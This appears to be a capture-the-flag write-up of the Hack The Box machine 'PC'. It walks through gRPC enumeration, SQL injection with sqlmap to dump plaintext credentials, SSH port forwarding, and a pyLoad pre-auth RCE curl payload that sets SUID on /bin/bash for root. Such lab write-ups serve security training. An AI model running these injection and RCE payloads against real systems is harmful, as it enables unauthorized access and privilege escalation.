---
title: "PC"
tags:
    - machine
    - sqli
    - suid
    - linux privesc
date: "2024-02-09"
thumbnail: "/assets/img/thumbnail/PC.png"
bookmark: true
---

# Description
---

<img src="/assets/img/htb/pc/Capture1.JPG" alt="pc">

# Solution
## Recon
---

Applying nmap scan

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/PC]
└─$ nmap -sV -sC -Pn -p 80,50051 -oA pc  10.10.11.214

# Nmap 7.92 scan initiated Thu Aug 17 12:37:10 2023 as: nmap -sV -sC -Pn -p- -oA pc 10.10.11.214
Nmap scan report for 10.10.11.214
Host is up (0.075s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.92%I=7%D=8/17%Time=64DDF8D7%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 17 12:39:34 2023 -- 1 IP address (1 host up) scanned in 143.38 seconds

```

We got this as an output. We have an interesting service on port 50051
After searching about 50051, we will find that the service is gRPC.

## Shell as sau
---

To access its UI there’s a tool called grpcui explained <a href="https://github.com/fullstorydev/grpcui">here</a>
After installing it, we will get access to this GUI.

<img src="/assets/img/htb/pc/Capture2.JPG" alt="grpcui gui">

In the method name field we have 3 options: **Login**,**Register** and **getinfo**
Make sure that burp is opened and receiving the requests.
Let’s try registering using credentials **youssif:youssif** Then login using these credentials and you will get this response.

<img src="/assets/img/htb/pc/Capture3.JPG" alt="register">

We see that we got an id and token.
Let’s go to getinfo and use the id we got 345 => we got this msg

<img src="/assets/img/htb/pc/Capture4.JPG" alt="getinfo">

So we will add the token we got in the metadata field and we will get in the response => “message”: “Will update soon.”
We were using burp let’s go to the requests and send them to the repeater to examine them.
getinfo request is most interesting of them and id parameter is vulnerable to sqli and it can be detected using `id="345 or 1=1--` u will get a different message.
Let’s go to sqlmap and because this request method is POST so we will copy the request in text file and use it with sqlmap, for more information <a href="https://hackertarget.com/sqlmap-post-request-injection/">here</a> 
So from the previous link we knew that we will save the request in a file and use this command.

```bash
sqlmap -r request.txt -p id --tables
```

From this we knew that we have two tables accounts and messages, We are interested in Accounts table.
Anyway Let’s dump the table using this command.

```bash
sqlmap -r request.txt -p id -T accounts --dump
```

<img src="/assets/img/htb/pc/Capture5.JPG" alt="password">

in the output we will find this



passwords are plain text and the user sau seems to be out goal
Actually, IDK what is the pronounce of this name it seems like Siuuuuuuuuuuuuuuuuu

Anyway, when we use this credentials of sau in ssh we get the shell successfully
Congratzzzz we got the user's flag 

<img src="/assets/img/htb/pc/Capture6.JPG" alt="siuuuuuuuu">


## shell as root
---

Let’s move to Root part.

after some enumeration using `netstat -a` I found that `127.0.0.1:8000 in listening state`.
We will use port forwarding to be able to access it using the command

```bash
ssh -L 9001:127.0.0.1:8000 sau@10.10.11.214
```

So we can access it from firefox using the url http://127.0.0.1:9001
We will find that the process is called pyload and after enumerating the running processes using ps -ef we will find that it’s running process by the root.

After searching for exploit for pyload i found many useful articles like:
<a href="https://huntr.com/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/?source=post_page-----e887b51cffc1--------------------------------">1</a>
<a href="https://www.exploit-db.com/exploits/51532?source=post_page-----e887b51cffc1--------------------------------">2</a>
<a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad?source=post_page-----e887b51cffc1--------------------------------">3</a>

All of these are useful i used this POC for the RCE:-

```bash
curl -i -s -k -X $'POST' --data-binary $'jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:4444/flash/addcrypted2'
```

The url encoded part:
 `%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29`
is the command i used which is `pyimport os;os.system(“chmod u+s /bin/bash”)`
Then we can execute `/bin/bash -p` using the user sau because `/bin/bash` got **SUID** permission.

<img src="/assets/img/htb/pc/Capture7.JPG" alt="rooted">

Rooted !!

I wish this writeup was useful, THANK YOU.

<img src="/assets/img/htb/pc/Capture8.JPG" alt="thanks">